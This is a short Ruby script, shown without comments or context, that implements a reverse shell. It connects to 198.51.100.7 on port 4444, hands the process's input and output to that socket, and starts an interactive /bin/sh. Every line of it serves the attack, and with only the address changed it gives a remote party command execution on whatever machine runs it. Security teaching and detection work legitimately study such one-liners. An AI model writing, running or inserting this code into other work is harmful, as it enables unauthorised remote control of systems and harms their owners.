require 'socket'
s = TCPSocket.new('198.51.100.7', 4444)
$stdin.reopen(s)
$stdout.reopen(s)
exec('/bin/sh', '-i')
